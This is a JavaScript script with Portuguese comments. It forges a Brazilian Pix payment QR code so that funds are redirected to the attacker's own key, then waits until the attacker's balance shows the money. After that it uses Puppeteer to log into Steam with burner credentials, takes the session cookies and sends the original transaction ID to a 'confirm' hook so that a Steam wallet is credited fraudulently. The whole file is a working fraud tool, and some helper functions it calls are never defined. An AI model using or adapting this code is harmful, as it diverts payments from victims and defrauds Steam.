import puppeteer from 'puppeteer';
import { spoof } from './lib/qrforger.js';
import { confirm } from './lib/sthook.js';

const MY_PIX_KEY = 'seu-cpf-ou-chave-aqui';   // << chave que receberá o Pix
const CODE = process.argv[2];                 // passar código Pix na linha de comando

(async () => {
  const { forged, qr } = await spoof(CODE, MY_PIX_KEY);
  console.log('QR spoofado gerado em data-url:\n', qr);

  // Salva imagem local
  require('fs').writeFileSync('qr-fake.png', qr.split(',')[1], 'base64');

  // Aguarda até detectar Pix recebido (consulta API do banco ou web-scrap do app)
  // Exemplo polling simplório:
  let paid = false;
  while (!paid) {
    const bal = await checkBalance(); // função que você cria pra consultar seu banco
    if (bal > 0) paid = true;
    await new Promise(r => setTimeout(r, 5000));
  }

  // Extrai cookies de sessão Steam via Puppeteer
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();
  await page.goto('https://store.steampowered.com/login');
  // ... login automático com suas creds burner ...
  const cookies = (await page.cookies()).map(c => `${c.name}=${c.value}`).join('; ');

  // Envia confirmação
  const txid = parse(CODE)['26']['05'];   // campo txid
  await confirm(txid, cookies);
  console.log('Wallet creditado.');
  await browser.close();
})();
